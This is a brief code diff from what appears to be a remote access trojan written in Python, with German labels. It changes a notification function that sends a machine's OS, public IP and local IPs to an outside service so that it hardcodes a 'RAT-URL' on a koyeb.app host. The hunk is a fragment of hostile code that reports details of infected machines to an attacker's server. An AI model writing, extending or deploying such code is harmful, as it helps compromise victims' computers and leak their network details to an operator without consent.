@@ -48,7 +48,7 @@ def send_ntfy_notification():
             f"OS: {platform.platform()}\n"
             f"Öffentliche IP: {get_public_ip()}\n"
             f"Lokale IPs: {get_local_ips()}\n"
-            f"RAT-URL: {SERVER_URI}"
+            f"RAT-URL: https://yawning-chameleon-norobb-e4dabbb0.koyeb.app"
         )
         
         req = urllib.request.Request(
